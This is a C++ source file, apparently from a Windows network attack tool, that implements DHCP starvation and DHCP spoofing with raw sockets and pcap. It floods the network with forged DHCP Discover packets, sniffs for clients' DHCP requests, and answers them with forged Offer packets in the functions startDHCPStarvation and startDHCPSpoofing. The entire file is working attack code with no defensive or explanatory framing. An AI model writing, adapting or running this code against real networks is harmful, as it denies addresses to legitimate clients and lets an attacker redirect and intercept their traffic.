#define _CRT_SECURE_NO_WARNINGS
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define HAVE_REMOTE
#define WPCAP

#include "Headers.h"
#include "Packets.h"
#include "Utils.h"
#include "Spoofing.h"

#include <pcap.h>
#pragma comment(lib, "wpcap.lib")
#pragma comment(lib, "packet.lib")

#include <time.h>
#include <iostream>
#include <Mstcpip.h>
#include <winsock2.h>
#include <WS2tcpip.h>
#pragma pack(1)
#pragma comment(lib, "Ws2_32.lib")

void getDHCPPacketInfo(char* packet, DHCP_header& pDHCP, UDP_header& pUDP, IP_header& pIP);

int sendDiscoverPacket(AddressInfo& info)
{
	SOCKET s;
	sockaddr_in dst;
	int optval = 1;

	dst.sin_family = AF_INET;
	dst.sin_port = htons(67);								/* difine the destination */
	inet_pton(AF_INET, (char*)info.broadcast, &dst.sin_addr.s_addr);

	s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW); //Create a RAW socket

	if (s == SOCKET_ERROR)
	{
		std::cout << "Socket error <" << WSAGetLastError() << ">" << std::endl;
		WSACleanup();
		return 1;
	}

	setsockopt(s, IPPROTO_IP, IP_HDRINCL, (char*)&optval, sizeof optval); //Set the socket as a RAW socket


	char* raw_packet = new char[65536];
	CreateDHCPDiscoverPacket(raw_packet, info);

	sendto(
		s,
		raw_packet,
		sizeof(IP_header) + sizeof(UDP_header) + sizeof(DHCP_header),
		0, (sockaddr*)&dst,
		sizeof(dst)
	);
	delete[] raw_packet;
	closesocket(s);
	return 0;
}

int recvDHCPPsackets(AddressInfo& info)
{
	SOCKET s;
	sockaddr_in sockinfo;
	sockaddr_in dst;
	int size = sizeof(dst);

	int optval = 1;
	int in;
	int error;

	DHCP_header pDHCP{};
	UDP_header pUDP{};
	IP_header pIP{};

	sockinfo.sin_addr.s_addr = inet_addr((const char*)info.ipv4);
	sockinfo.sin_family = AF_INET;
	sockinfo.sin_port = htons(0);


	s = socket(AF_INET, SOCK_RAW, IPPROTO_UDP); //Create a RAW socket

	if (s == SOCKET_ERROR)
	{ 
		std::cout << "Socket error <" << WSAGetLastError() << ">" <<  std::endl;
		WSACleanup();
		return 1;
	}
		

	bind(s, (sockaddr*)&sockinfo, sizeof(sockinfo));

	if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, (char*)&optval, sizeof optval) == -1) //Set the socket as a RAW socket
	{
		std::cout << "setsockopt error: " << WSAGetLastError() << std::endl;
		WSACleanup();
		return 1;
	}
	WSAIoctl(s, SIO_RCVALL, &optval, sizeof(optval), 0, 0, (LPDWORD)&in, 0, 0);

	char* raw_packet = new char[65536];
	memset(raw_packet, 0, 65536);

	error = recvfrom(s, raw_packet, 65536, 0, (sockaddr*)&dst, &size);

	if (error == SOCKET_ERROR)
	{ 
		std::cout << " recv error: " << WSAGetLastError() << WSACleanup() << std::endl;
		WSACleanup();
		return 1;
	}

	getDHCPPacketInfo(raw_packet, pDHCP, pUDP, pIP);
	if (ntohs(pUDP.dst_port) == 67)
	{
		if (checkForDHCP(pDHCP))
			if (sendOfferPacket(pDHCP, pIP, info))
				return 1;
	}
	delete[] raw_packet;
	closesocket(s);
	return 0;
}

int sendOfferPacket(DHCP_header& rDHCP, IP_header& rIP, AddressInfo& info)
{
	pcap_t* sock = pcap_open(getDeviceName(info), 0, PCAP_OPENFLAG_PROMISCUOUS, 0, NULL, NULL);
	
	char* raw_packet = new char[65536];
	if (!sock)
	{
		std::cout << "error in pcap socket" << std::endl; return 1;
	}
		
	
	CreateDHCPOfferPacket(raw_packet, (void*)&rDHCP, (void*)&rIP, info);

	if (pcap_sendpacket(
		sock,
		(u_char*)raw_packet,
		sizeof(Ethernet_header) + sizeof(IP_header) + sizeof(UDP_header) + sizeof(DHCP_header)
	) != 0)
	{
		std::cout << "error " << pcap_geterr(sock) << std::endl;
		return 1;
	}
		
	
#if _DEBUG
	std::cout << "sent" << std::endl;
#endif
	delete[] raw_packet;
	pcap_close(sock);
	return 0;
}


DWORD WINAPI startDHCPStarvation(LPVOID info)
{
	
	for (int i = 0; i < 1000; i++)
	{
		sendDiscoverPacket(*(AddressInfo*)info);
		Sleep(20);
	}
	return 1;
}


DWORD WINAPI startDHCPSpoofing(LPVOID info)
{
	while (!recvDHCPPsackets(*(AddressInfo*)info)){}
	return -1;
}
